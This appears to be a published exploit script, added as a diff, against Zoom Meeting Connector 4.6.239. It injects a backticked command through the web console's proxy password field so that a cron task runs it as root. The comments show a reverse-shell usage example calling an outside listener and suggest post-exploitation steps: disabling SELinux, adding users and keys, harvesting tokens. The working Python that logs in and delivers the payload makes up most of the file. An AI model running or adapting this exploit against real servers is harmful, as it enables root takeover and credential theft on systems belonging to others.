@@ -1,0 +1,237 @@
+# Exploit Title: Zoom Meeting Connector 4.6.239.20200613 - Remote Root Exploit (Authenticated)
+# Date: 12-29-2020
+# Exploit Author: Jeremy Brown
+# Vendor Homepage: https://support.zoom.us/hc/en-us/articles/201363093-Deploying-the-Meeting-Connector
+# Software Link: https://support.zoom.us/hc/en-us/articles/201363093-Deploying-the-Meeting-Connector
+# Version: 4.6.239.20200613
+
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+#
+# zoomer.py
+#
+# Zoom Meeting Connector Post-auth Remote Root Exploit
+#
+# Jeremy Brown [jbrown3264/gmail]
+# Dec 2020
+#
+# The Meeting Connector Web Console listens on port 5480. On the dashboard
+# under Network -> Proxy, one can enable a proxy server. All of the fields
+# are sanitized to a certain degree, even the developers noting in the proxy()
+# function within backend\webconsole\WebConsole\net.py that they explicitly
+# were concerned with command injection and attempted to prevent it:
+#
+# if ('"' in proxy_name) or ('"' in proxy_passwd):  # " double quotes cannot be used to prevent shell injection
+#     is_valid = False
+#
+# It makes sense to leave some flexibility in the character limits here
+# passwords are often expected to contain more than alphanumeric characters.
+# But of course that means the Proxy Password field is still vulnerable to
+# command injection with the ` character.
+#
+# The proxy data gets concatenated and written to /etc/profile.d/proxy.sh.
+# Every three minutes, a task runs which executes this proxy script as root.
+# After submission the dashboard says “The proxy will take effect after the
+# server reboot!”, but the commands will still be executed within actually
+# requiring a reboot. Keep in mind that the commands will be executed blind.
+#
+# For example, `id>/tmp/proxy_test` given as the Proxy Password will produce
+# this in the /tmp/proxy_test file:
+#
+# uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
+#
+# MMR was tested, but Controller and VRC may also be vulnerable
+#
+# Usage
+# > zoomer.py 10.0.0.10 admin xsecRET1 "sh -i >& /dev/udp/10.0.0.11/5555 0>&1"
+# login succeeded
+# command sent to server
+#
+# $ nc -u -lvp 5555
+# ....
+# sh: no job control in this shell
+# sh-4.2# pwd
+# /root
+# sh-4.2#
+#
+# setenforce 0 if SELinux bothers you, service sshd start and add users/keys,
+# check tokens in /opt/zoom/conf/register, check out the local environment, etc.
+#
+# Dependencies
+# - pip install pyquery
+#
+# Fix
+# Zoom says they've fixed this in the latest version
+#
+
+import os
+import sys
+import argparse
+import requests
+import urllib.parse
+from pyquery import PyQuery
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class Zoomer(object):
+	def __init__(self, args):
+		self.target = args.target
+		self.port = args.port
+		self.username = args.username
+		self.password = args.password
+		self.command = args.command
+
+	def run(self):
+		target = "https://" + self.target + ':' + str(self.port)
+
+		session = requests.Session()
+		session.verify = False
+
+		#
+		# get csrftoken from /login and use it to auth with creds
+		#
+		try:
+			resp = session.get(target + "/login")
+		except Exception as error:
+			print("Error: %s" % error)
+			return -1
+
+		try:
+			csrftoken = resp.headers['set-cookie'].split(';')[0]
+		except:
+			print("Error: couldn't parse csrftoken from response header")
+			return -1
+
+		csrfmiddlewaretoken = self.get_token(resp.text, 'csrfmiddlewaretoken')
+
+		if(csrfmiddlewaretoken == None):
+			return -1
+
+		data = \
+			{'csrfmiddlewaretoken':csrfmiddlewaretoken,
+			'name':self.username,
+			'password':self.password}
+
+		headers = \
+			{'Host':self.target + ':' + str(self.port),
+			'Referer':target,
+			'Cookie':csrftoken}
+
+		try:
+			resp = session.post(target + "/login", headers=headers, data=data)
+		except Exception as error:
+			print("Error: %s" % error)
+			return -1
+
+		if(resp.status_code != 200 or 'Wrong' in resp.text):
+			print("login failed")
+			return -1
+		else:
+			print("login succeeded")
+
+		#
+		# get csrfmiddlewaretoken from /network/proxy and post cmd
+		#
+		try:
+			resp = session.get(target + "/network/proxy")
+		except Exception as error:
+			print("Error: %s" % error)
+			return -1
+
+		csrfmiddlewaretoken = self.get_token(resp.text, 'csrfmiddlewaretoken')
+
+		cookies = session.cookies.get_dict()
+
+		#
+		# this happens with view-only users
+		#
+		if(len(cookies) < 2):
+			print("Error: failed to get session ID")
+			return -1
+
+		command = '`' + self.command + '`'
+
+		headers = \
+			{'Host':self.target + ':' + str(self.port),
+			'Referer':target,
+			'Cookie': \
+				'csrftoken=' + cookies['csrftoken'] + ';' + \
+				'sessionid=' + cookies['sessionid']}
+
+		data = \
+			{'csrfmiddlewaretoken':csrfmiddlewaretoken,
+			'proxyValue':1,
+			'proxyAddr':'localhost',
+			'proxyPort':8080,
+			'proxyName':'test',
+			'proxyPasswd':command}
+
+		try:
+			resp = session.post(target + "/network/proxy", headers=headers, data=data)
+		except Exception as error:
+			print("Error: %s" % error)
+			return -1
+
+		if(resp.status_code != 200):
+			print("something failed")
+			return -1
+		else:
+			print("command sent to server")
+
+		return 0
+
+	def get_token(self, body, name):
+		token = None
+
+		pq = PyQuery(body)
+
+		if(name == 'csrftoken'):
+			print("csrftoken")
+
+		if(name == 'csrfmiddlewaretoken'):
+			token = pq('input').attr('value')
+
+		return token
+
+def arg_parse():
+	parser = argparse.ArgumentParser()
+
+	parser.add_argument("target",
+						type=str,
+						help="Zoom server")
+
+	parser.add_argument("-p",
+						"--port",
+						type=int,
+						default=5480,
+						help="Zoom port")
+
+	parser.add_argument("username",
+						type=str,
+						help="Valid username")
+
+	parser.add_argument("password",
+						type=str,
+						help="Valid password")
+
+	parser.add_argument("command",
+						type=str,
+						help="Command to execute (replace space with $IFS ?)")
+
+	args = parser.parse_args()
+
+	return args
+
+def main():
+	args = arg_parse()
+
+	zm = Zoomer(args)
+
+	result = zm.run()
+
+	if(result > 0):
+		sys.exit(-1)
+
+if(__name__ == '__main__'):
+	main()
